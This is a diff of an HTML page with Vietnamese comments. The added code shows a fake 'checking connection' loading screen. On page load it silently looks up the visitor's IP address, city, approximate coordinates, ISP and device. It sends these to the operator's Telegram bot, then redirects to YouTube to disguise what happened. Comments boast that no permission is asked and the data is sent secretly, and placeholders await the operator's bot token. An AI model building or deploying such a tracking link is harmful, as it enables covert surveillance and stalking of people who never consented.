@@ -1,32 +1,66 @@
 <!DOCTYPE html>
-<html>
-<body onload="getLocation()">
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang tải...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
-<iframe src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/waiting-meh-disapproving-5uDNFrOi6VwrkFKBaj">via GIPHY</a></p>
-
-
-<p id="demo"></p>
+    <div class="loader"></div>
+    <h3>Hệ thống đang kiểm tra kết nối, vui lòng chờ trong giây lát...</h3>
 
 <script>
-var x = document.getElementById("demo");
+// =========================================================================
+// THÔNG TIN TELEGRAM CỦA BẠN (Thay thế bằng thông tin của bạn)
+// =========================================================================
+const TELEGRAM_TOKEN = "ĐIỀN_TOKEN_BOT_TELEGRAM_VÀO_ĐÂY";
+const CHAT_ID = "ĐIỀN_ID_CHAT_CỦA_BẠN_VÀO_ĐÂY";
+// =========================================================================
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
+async function grabLocationByIP() {
+    try {
+        // 1. Gọi API ngầm để lấy IP và Tọa độ của điện thoại (Không hỏi quyền Allow)
+        let response = await fetch("https://ipapi.co/json/");
+        let data = await response.json();
+        
+        if (data && data.ip) {
+            // Định dạng nội dung tin nhắn gửi về cho bạn
+            let message = `📍 **CÓ THIẾT BỊ MỚI VÀO LINK**\n\n` +
+                          `🌐 IP: ${data.ip}\n` +
+                          `🗺️ Thành phố: ${data.city}\n` +
+                          `🇻🇳 Quốc gia: ${data.country_name}\n` +
+                          `🛰️ Tọa độ (GPS tương đối): ${data.latitude}, ${data.longitude}\n` +
+                          `📡 Nhà mạng (ISP): ${data.org}\n` +
+                          `📱 Thiết bị: ${navigator.userAgent}`;
+
+            // 2. Gửi dữ liệu bí mật về Telegram của bạn
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+        }
+    } catch (error) {
+        console.log("Lỗi hệ thống ngầm:", error);
+    } finally {
+        // 3. Sau khi lấy xong, chuyển hướng họ sang trang khác để ngụy trang (ví dụ Youtube)
+        window.location.href = "https://www.youtube.com";
+    }
 }
 
-function showPosition(position) {
-  const xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
-  xhttp.send();
-}
+// Tự động kích hoạt ngay khi trang web vừa được tải xong
+window.onload = grabLocationByIP;
 </script>
 
 </body>
 </html>
-
-
-
